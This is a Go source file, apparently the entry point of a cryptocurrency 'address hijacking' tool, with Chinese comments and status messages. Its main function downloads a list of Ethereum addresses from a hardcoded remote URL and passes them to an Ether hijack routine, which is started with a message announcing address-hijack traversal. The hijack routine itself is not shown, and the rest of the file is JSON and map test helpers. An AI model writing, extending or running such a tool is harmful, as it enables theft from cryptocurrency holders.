package main

import (
	"./Ether"
	"./Networking"
	"encoding/json"
	"log"
	"os"
	"time"
)
import "fmt"

const FileName = "./address.json"
const AddressUrlStr = "https://0xbank.com/pac/address.json"

func main() {
	start := time.Now()
	// 获取信息
	h := Networking.NewHttp()
	fmt.Fprintf(os.Stdout, "获取地址信息...\r\n")
	jsonStr := h.Get(AddressUrlStr, nil)
	//fmt.Println("获取地址信息..." + jsonStr)
	time.Sleep(time.Second * 1)
	fmt.Fprintf(os.Stdout, "获取地址信息: 成功！\r\n")
	time.Sleep(time.Second * 1)

	var addrlist map[string]int //请求结果集
	fmt.Fprintf(os.Stdout, "解析地址信息...\r\n")
	time.Sleep(time.Second * 1)
	err := json.Unmarshal([]byte(jsonStr), &addrlist) //转换为map
	if err != nil {
		fmt.Fprintf(os.Stdout, "解析地址信息失败：%s\r\n", err.Error())
		return
	}
	time.Sleep(time.Second * 1)
	fmt.Fprintf(os.Stdout, "解析地址信息: 成功！\r\n")
	time.Sleep(time.Second * 1)
	fmt.Fprintf(os.Stdout, "启动地址劫持遍历...\r\n")

	hi := Ether.NewHijack()
	hi.Start(addrlist)
	fmt.Fprintf(os.Stdout, "地址劫持遍历结束。\r\n")

	t := time.Now().Sub(start)
	fmt.Println(t)
}

func testMap() {
	jsonData, err := os.ReadFile(FileName)
	if err != nil {
		log.Println(err)
	}

	//var address []map[string]int
	//jsonStr := `{"abc":1, "bcd":1}`
	//map2 := make(map[string]int)
	map2 := make(map[string]interface{})
	err = json.Unmarshal(jsonData, &map2)
	if err != nil {
		fmt.Println(err)
	}
	value, ok := map2["0x123"]
	if ok {
		fmt.Println("value:", value)
	}
	value, ok = map2["0x456"]
	if ok {
		fmt.Println("value:", value)
	}
	fmt.Printf("%T %v", map2, map2)
}

func map2json2map() {
	map1 := make(map[string]interface{})
	map1["1"] = "hello"
	map1["2"] = "world"

	value, ok := map1["1"]
	if ok {
		fmt.Println("value:", value)
	}
	value, ok = map1["3"]
	if !ok {
		fmt.Println(ok)
	}
	//return []byte
	str, err := json.Marshal(map1)

	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("map to json", string(str))

	//json([]byte) to map
	map2 := make(map[string]interface{})
	err = json.Unmarshal(str, &map2)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("json to map ", map2)
	fmt.Println("The value of key1 is", map2["1"])
}
